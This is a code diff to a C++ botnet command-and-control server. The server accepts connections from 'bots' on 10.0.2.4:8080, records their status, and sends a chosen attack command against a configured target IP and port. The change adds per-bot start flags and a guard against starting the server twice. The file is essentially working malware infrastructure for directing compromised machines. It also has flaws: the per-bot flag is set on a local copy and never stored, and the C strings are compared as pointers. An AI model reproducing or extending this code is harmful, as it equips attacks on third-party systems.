@@ -13,6 +13,7 @@
 using namespace std;
 
 bool start = false;
+bool server_started = false;
 
 char* attack = "None";
 string target_ip;
@@ -23,6 +24,12 @@ vector<thread> threads;
 int target_port;
 int server_fd, valread, client_socket;
 struct sockaddr_in server_address, client_address;
+struct netbot_status {
+	int id;
+	bool start;
+};
+
+vector<netbot_status> netbots_statuses;
 
 void setup_target_parameters()
 {	
@@ -81,17 +88,36 @@ void threaded(int i)
 {
 	char buffer[1024] = { 0 };	
 	cout << "\nClient Socket File Descriptor: " << i << "\n";
-
+	
+	bzero(&buffer, sizeof(buffer));
 	valread = read(i, buffer, 1024);
         cout << "\n" << buffer;
 	while (1)
 	{
-		if (attack != "None" && start == true)
+		netbot_status bot;
+	
+		if (start == true) 
+		{
+			vector<netbot_status>::iterator iter = netbots_statuses.begin();
+			for(iter; iter < netbots_statuses.end(); iter++) 
+			{
+				if ((*iter).id == i) 
+				{
+					bot = *iter;
+					break;				
+				}
+			}
+			
+			bot.start = true;
+		}
+
+		if (attack != "None" && bot.start == true)
 	       	{
-			cout << "yes";
 			send(i, attack, strlen(attack), 0);
 			cout << "Server attack sent\n";
-			break;
+			sleep(1);
+			bot.start = false;
+			start = false;
 		}
 	}	
 }
@@ -107,6 +133,7 @@ void connection_listener(int i)
 		}
 
 		bots.push_back(inet_ntoa(client_address.sin_addr));
+		netbots_statuses.push_back({ client_socket, false });
 	
 		cout << "\nclient connected: " << inet_ntoa(client_address.sin_addr) << "\t Total Bots Connected: " << bots.size() << endl;
 
@@ -119,42 +146,46 @@ void connection_listener(int i)
 
 void start_server()
 {
-	int opt = 1;
-	int addrlen = sizeof(server_address);
-	char buffer[1024] = { 0 };
-	char* hello = "Hello from server";
+	if (server_started == false)
+	{
+		server_started = true;
+		int opt = 1;
+		int addrlen = sizeof(server_address);
+		char buffer[1024] = { 0 };
+		char* hello = "Hello from server";
 	
-	// Creating socket file descriptor
-	if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-		perror("Socket failed");
-		exit(EXIT_FAILURE);
-	}
+		// Creating socket file descriptor
+		if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+			perror("Socket failed");
+			exit(EXIT_FAILURE);
+		}
 
-	// Forcefully attaching socket to the port specified
-	if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
-		perror("setsockopt");
-		exit(EXIT_FAILURE);
-	}
+		// Forcefully attaching socket to the port specified
+			if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
+			perror("setsockopt");
+			exit(EXIT_FAILURE);
+		}
 
-	server_address.sin_family = AF_INET;
-	server_address.sin_addr.s_addr = inet_addr("10.0.2.4");
-	server_address.sin_port = htons(8080);
+		server_address.sin_family = AF_INET;
+		server_address.sin_addr.s_addr = inet_addr("10.0.2.4");
+		server_address.sin_port = htons(8080);
 
-	// Binding address and port to the socket
-	if (bind(server_fd, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
-		perror("bind failed");
-		exit(EXIT_FAILURE);
-	}
+		// Binding address and port to the socket
+		if (bind(server_fd, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
+			perror("bind failed");
+			exit(EXIT_FAILURE);
+		}
 
-	// Wait for clients connections
-	if (listen(server_fd, 3) < 0) {
-		perror("listem");
-		exit(EXIT_FAILURE);
-	}
+		// Wait for clients connections
+		if (listen(server_fd, 3) < 0) {
+			perror("listem");
+			exit(EXIT_FAILURE);
+		}
         
-	tListener = thread(connection_listener, 1);
-	tListener.detach();
-	
+		tListener = thread(connection_listener, 1);
+		tListener.detach();
+	}
+		
 	char char_choice[1];
 	int int_choice = 0;
 	do
